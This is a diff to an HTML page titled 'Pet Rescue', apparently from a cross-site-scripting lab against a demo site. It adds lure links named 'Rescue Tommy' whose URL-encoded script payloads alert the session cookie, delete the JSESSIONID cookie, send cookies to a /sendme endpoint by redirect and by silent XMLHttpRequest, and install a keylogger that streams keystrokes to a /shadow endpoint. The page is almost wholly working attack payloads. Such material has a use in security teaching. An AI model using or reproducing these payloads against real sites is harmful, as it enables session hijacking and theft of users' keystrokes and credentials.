@@ -1,9 +1,5 @@
 <!DOCTYPE html>
 <html lang="en"
-      xmlns:th="http://www.thymeleaf.org"
-      xmlns:layout="http://www.ultraq.net.nz/thymeleaf/layout"
-      layout:decorate="templates/default">
-<html lang="en"
       xmlns:th="http://www.thymeleaf.org">
     <head>
         <title>Pet Rescue</title>
@@ -11,9 +7,19 @@
     </head>
     <body>
         <div>
-            <h1><a href="http://trustedsite.ac.uk:8080/search?q=%3Cscript%3Ealert('Worked')%3C/script%3E">Rescue Tommy!</a></h1>
+            <h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Ealert('Worked')%3C/script%3E">Rescue Tommy!</a></h1>
             
-          
+            
+            <h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E">Alert Tommy's Cookies!</a></h1>
+            
+            <h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Edocument.cookie%C2%A0%3D%C2%A0%22JSESSIONID%3D%3B%20expires%3DThu%2C%2001%20Jan%201999%2000%3A00%3A00%20UTC%3B%20path%3D%2F%3B%22%3C%2Fscript%3E">Remove Tommy's Cookies!</a></h1>
+            
+          	<h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Ewindow.location%3D%27%2Fsendme%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E">Send me Tommy's Cookies!</a></h1>
+            
+            <h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Evar%20req%20%3D%20new%20XMLHttpRequest()%3Breq.open(%27GET%27%2C%20%27http%3A%2F%2Ftrustedsite.ac.uk%3A8080%2Fsendme%3Fcookie%3D%27%2Bdocument.cookie%2C%20true)%3Breq.send()%3B%3C%2Fscript%3E">Send me Tommy's Cookies (Silently)!</a></h1>
+            
+            <h1><a href="http://trustedsite.ac.uk:8080/items?q=%3Cscript%3Evar%20buffer%3D%5B%5D%3Bvar%20attacker%20%3D%27http%3A%2F%2Ftrustedsite.ac.uk%3A8080%2Fshadow%3Fkeys%3D%27%3Bdocument.onkeypress%20%3D%20function(e)%20%7Bvar%20timestamp%20%3D%20Date.now()%20%7C%200%3B%20%20%20var%20stroke%20%3D%20%7Bk%3A%20e.key%2Ct%3A%20timestamp%20%20%20%7D%3B%20%20%20buffer.push(stroke)%3B%20%20%20%20%20%20%7D%20%3B%20%20%20%20window.setInterval(function()%20%7B%20%20%20if%20(buffer.length%20%3E%200)%20%7Bvar%20data%20%3D%20encodeURIComponent(JSON.stringify(buffer))%3Bnew%20Image().src%20%3D%20attacker%20%2B%20data%3Bbuffer%20%3D%20%5B%5D%3B%7D%7D%2C%20200)%3B%3C%2Fscript%3E">Send me some keystrokes!</a></h1>
+            
             
         </div>
     </body>
